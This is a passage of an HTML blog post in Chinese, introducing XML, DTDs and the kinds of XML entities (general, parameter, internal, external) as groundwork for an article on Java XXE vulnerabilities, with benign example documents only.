@@ -1,0 +1,768 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/Str3am.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/Str3am.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|Damion:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('https://jlkl.github.io').hostname,
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.7.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+  <meta name="description" content="1 XML 基础XML(可扩展标记语言，EXtensible Markup Language )，是一种标记语言，用来传输和存储数据 1.1 XML文档结构XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java XXE 漏洞">
+<meta property="og:url" content="https://jlkl.github.io/2020/08/24/Java_03/index.html">
+<meta property="og:site_name" content="Str3am&#39;s Blog">
+<meta property="og:description" content="1 XML 基础XML(可扩展标记语言，EXtensible Markup Language )，是一种标记语言，用来传输和存储数据 1.1 XML文档结构XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20200824193247.png">
+<meta property="og:image" content="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20200824182027.png">
+<meta property="og:image" content="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20200824182311.png">
+<meta property="og:image" content="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20200824182435.png">
+<meta property="og:image" content="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20200824191609.png">
+<meta property="article:published_time" content="2020-08-24T11:47:41.000Z">
+<meta property="article:modified_time" content="2020-08-24T11:59:19.486Z">
+<meta property="article:author" content="Str3am">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="XXE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20200824193247.png">
+
+<link rel="canonical" href="https://jlkl.github.io/2020/08/24/Java_03/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>Java XXE 漏洞 | Str3am's Blog</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?fcdffc3f3c9531fca765ea966be04985";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Str3am's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Str3am's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags<span class="badge">14</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives<span class="badge">32</span></a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="https://jlkl.github.io/2020/08/24/Java_03/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Str3am.jpg">
+      <meta itemprop="name" content="Str3am">
+      <meta itemprop="description" content="这个人很懒，什么也没留下">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Str3am's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Java XXE 漏洞
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2020-08-24 19:47:41 / Modified: 19:59:19" itemprop="dateCreated datePublished" datetime="2020-08-24T19:47:41+08:00">2020-08-24</time>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2020/08/24/Java_03/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/08/24/Java_03/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              <span>8k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              <span>10 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="1-XML-基础"><a href="#1-XML-基础" class="headerlink" title="1 XML 基础"></a>1 XML 基础</h2><p>XML(可扩展标记语言，EXtensible Markup Language )，是一种标记语言，用来传输和存储数据</p>
+<h3 id="1-1-XML文档结构"><a href="#1-1-XML文档结构" class="headerlink" title="1.1 XML文档结构"></a>1.1 XML文档结构</h3><p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p>
+<a id="more"></a>
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML申明--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--文档类型定义--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [  &lt;!--定义此文档是 note 类型的文档--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span>  &lt;!--定义note元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>     &lt;!--定义to元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义from元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">head</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义head元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义body元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="1-2-DTD"><a href="#1-2-DTD" class="headerlink" title="1.2 DTD"></a>1.2 DTD</h3><p>DTD(文档类型定义，Document Type Definition )的作用是定义XML文档的合法构建模块。它使用一系列的合法元素来定义文档结构。</p>
+<p><strong>DTD引用方式</strong></p>
+<p>1）DTD 内部声明</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>2）DTD 外部引用</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素名称 <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"外部DTD的URI"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>3）引用公共DTD</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素名称 <span class="meta-keyword">PUBLIC</span> <span class="meta-string">"DTD标识名"</span> <span class="meta-string">"公用DTD的URI"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>DTD 关键字：</p>
+<ul>
+<li>DOCTYPE（DTD的声明）</li>
+<li>ENTITY（实体的声明）</li>
+<li>SYSTEM、PUBLIC（外部资源申请）</li>
+<li>ELEMENT（定义元素声明）</li>
+</ul>
+<p><strong>PCDATA</strong></p>
+<p>PCDATA 的意思是被解析的字符数据（parsed character data）。<br>可把字符数据想象为 XML 元素的开始标签与结束标签之间的文本。<br>PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。<br>文本中的标签会被当作标记来处理，而实体会被展开。<br>不过，被解析的字符数据不应当包含任何 &amp;、&lt; 或者 &gt; 字符；需要使用 &amp;、&lt; 以及 &gt; 实体来分别替换它们。</p>
+<p><strong>CDATA</strong></p>
+<p>CDATA 的意思是字符数据（character data）。<br>CDATA 是不会被解析器解析的文本。在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。</p>
+<h3 id="1-3-实体分类"><a href="#1-3-实体分类" class="headerlink" title="1.3 实体分类"></a>1.3 实体分类</h3><p>实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。<br>实体按类型主要分为以下四种：</p>
+<ul>
+<li>内置实体 (Built-in entities)</li>
+<li>字符实体 (Character entities)</li>
+<li>通用实体/普通实体 (General entities)</li>
+<li>参数实体 (Parameter entities)</li>
+</ul>
+<p>完整的实体类别可参考 <a href="https://www.tutorialspoint.com/dtd/dtd_entities.htm" target="_blank" rel="noopener">DTD - Entities</a></p>
+<h4 id="1-3-1-内置实体-Built-in-entities"><a href="#1-3-1-内置实体-Built-in-entities" class="headerlink" title="1.3.1 内置实体 (Built-in entities)"></a>1.3.1 内置实体 (Built-in entities)</h4><ul>
+<li>&amp;符号: <code>&amp;amp</code>;</li>
+<li>单引号: <code>&amp;apos</code>;</li>
+<li>＞: <code>&amp;gt</code>;</li>
+<li>＜: <code>&amp;lt</code>;</li>
+<li>双引号: <code>&amp;quot</code>;</li>
+</ul>
+<h4 id="1-3-2-字符实体-Character-entities"><a href="#1-3-2-字符实体-Character-entities" class="headerlink" title="1.3.2 字符实体 (Character entities)"></a>1.3.2 字符实体 (Character entities)</h4><p>通常是 html 的实体编码，例如：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = "1.0" encoding = "UTF-8" standalone = "yes"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">author</span>[</span></span><br><span class="line"><span class="meta">   <span class="meta">&lt;!ELEMENT <span class="meta-keyword">author</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">   <span class="meta">&lt;!ENTITY <span class="meta-keyword">copyright</span> <span class="meta-string">"&amp;#169;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;writer;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>&amp;#169</code> 即 <code>©</code></p>
+<h4 id="1-3-3-普通实体-General-entities"><a href="#1-3-3-普通实体-General-entities" class="headerlink" title="1.3.3 普通实体 (General entities)"></a>1.3.3 普通实体 (General entities)</h4><p>简单理解即引用替换，语法：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="meta-keyword">ename</span> <span class="meta-string">"text"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Example：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = "1.0"?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta">   <span class="meta">&lt;!ENTITY <span class="meta-keyword">source-text</span> <span class="meta-string">"tutorialspoint"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">   &amp;source-text;</span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="1-3-4-参数实体-Parameter-entities"><a href="#1-3-4-参数实体-Parameter-entities" class="headerlink" title="1.3.4 参数实体 (Parameter entities)"></a>1.3.4 参数实体 (Parameter entities)</h4><p>参数实体的目的是创建动态替换的文本节</p>
+<p>语法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % ename &quot;entity_value&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><em>entity_value</em> 可以是除 <code>&amp;</code>, <code>%</code> 或 <code>&quot;</code> 外所有字符</li>
+</ul>
+<p>test323.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">person</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"test323.dtd"</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">person</span>&gt;</span>  </span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span>Jason<span class="tag">&lt;/<span class="name">name</span>&gt;</span>  </span><br><span class="line">	<span class="tag">&lt;<span class="name">addr</span>&gt;</span>Shanghai<span class="tag">&lt;/<span class="name">addr</span>&gt;</span>  </span><br><span class="line">	<span class="tag">&lt;<span class="name">tel</span>&gt;</span>18701772821<span class="tag">&lt;/<span class="name">tel</span>&gt;</span>  </span><br><span class="line">	<span class="tag">&lt;<span class="name">br</span>/&gt;</span>  </span><br><span class="line">	<span class="tag">&lt;<span class="name">email</span>&gt;</span>18701772821@163.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">person</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>test323.dtd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;  </span><br><span class="line">&lt;!ELEMENT person (name,addr,tel,br,email)&gt;  </span><br><span class="line">&lt;!ENTITY % name &quot;(#PCDATA)&quot;&gt;  </span><br><span class="line">&lt;!ELEMENT addr %name;&gt;  </span><br><span class="line">&lt;!ELEMENT tel %name;&gt;  </span><br><span class="line">&lt;!ELEMENT br EMPTY&gt;  </span><br><span class="line">&lt;!ELEMENT email %name;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>参数实体必须先定义再使用，而不能像一般实体那样随意放置。</p>
+<h3 id="1-4-内部实体和外部实体"><a href="#1-4-内部实体和外部实体" class="headerlink" title="1.4 内部实体和外部实体"></a>1.4 内部实体和外部实体</h3><p>实体根据引用方式，还可分为内部实体与外部实体，看看这些实体的声明方式。</p>
+<p>内部实体：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY entity_name &quot;entity_value&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>外部实体：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY name SYSTEM &quot;URI&#x2F;URL&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-5-通用实体和参数实体"><a href="#1-5-通用实体和参数实体" class="headerlink" title="1.5 通用实体和参数实体"></a>1.5 通用实体和参数实体</h3><p>其实按照使用来分类，又可以将实体分为通用实体和参数实体。</p>
+<p><strong>通用实体</strong></p>
+<p>用 &amp;实体名; 引用的实体，他在DTD 中定义，在 XML 文档中引用</p>
+<p><strong>参数实体</strong></p>
+<ol>
+<li>使用 <code>% 实体名</code> (这里面空格不能少) 在 DTD 中定义，并且只能在 DTD 中使用 <code>%实体名;</code> 引用</li>
+<li>只有在 DTD 文件中，参数实体的声明才能引用其他实体</li>
+<li>和通用实体一样，参数实体也可以外部引用</li>
+</ol>
+<h4 id="1-5-1-内部通用实体"><a href="#1-5-1-内部通用实体" class="headerlink" title="1.5.1 内部通用实体"></a>1.5.1 内部通用实体</h4><p>语法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY entity-name &quot;entity-value&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Example：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE author[</span><br><span class="line">    &lt;!ENTITY writer &quot;Donald Duck.&quot;&gt;</span><br><span class="line">    &lt;!ENTITY copyright &quot;Copyright runoob.com&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;&#x2F;author&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-5-2-外部通用实体"><a href="#1-5-2-外部通用实体" class="headerlink" title="1.5.2 外部通用实体"></a>1.5.2 外部通用实体</h4><p>语法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY entity-name SYSTEM &quot;URI&#x2F;URL&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Example：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE author[</span><br><span class="line">    &lt;!ENTITY writer SYSTEM &quot;http:&#x2F;&#x2F;www.runoob.com&#x2F;entities.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY copyright SYSTEM &quot;http:&#x2F;&#x2F;www.runoob.com&#x2F;entities.dtd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;&#x2F;author&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-5-3-内部参数实体"><a href="#1-5-3-内部参数实体" class="headerlink" title="1.5.3 内部参数实体"></a>1.5.3 内部参数实体</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">person</span> [ </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">name</span> <span class="meta-string">"(#PCDATA)"</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">addr</span> %name;&gt;</span>  </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">tel</span> %name;&gt;</span>  </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">br</span> <span class="meta-keyword">EMPTY</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">email</span> %name;&gt;</span> </span></span><br><span class="line"><span class="meta">]&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">person</span>&gt;</span>  </span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span>Jason<span class="tag">&lt;/<span class="name">name</span>&gt;</span>  </span><br><span class="line">	<span class="tag">&lt;<span class="name">addr</span>&gt;</span>Shanghai<span class="tag">&lt;/<span class="name">addr</span>&gt;</span>  </span><br><span class="line">	<span class="tag">&lt;<span class="name">tel</span>&gt;</span>18701772821<span class="tag">&lt;/<span class="name">tel</span>&gt;</span>  </span><br><span class="line">	<span class="tag">&lt;<span class="name">br</span>/&gt;</span>  </span><br><span class="line">	<span class="tag">&lt;<span class="name">email</span>&gt;</span>18701772821@163.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">person</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="1-5-4-外部参数实体"><a href="#1-5-4-外部参数实体" class="headerlink" title="1.5.4 外部参数实体"></a>1.5.4 外部参数实体</h4><p>test323.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">person</span> [  </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="meta-keyword">person</span> (<span class="meta-keyword">name</span>,<span class="meta-keyword">addr</span>,<span class="meta-keyword">tel</span>,<span class="meta-keyword">br</span>,<span class="meta-keyword">email</span>)&gt;</span>  </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % （注意这里有个空格）content <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"test323.dtd"</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">    %content;  </span></span><br><span class="line"><span class="meta">]&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">person</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Jason<span class="tag">&lt;/<span class="name">name</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">addr</span>&gt;</span>Shanghai<span class="tag">&lt;/<span class="name">addr</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">tel</span>&gt;</span>18701772821<span class="tag">&lt;/<span class="name">tel</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>/&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">email</span>&gt;</span>18701772821@163.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">person</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>test323.dtd</p>
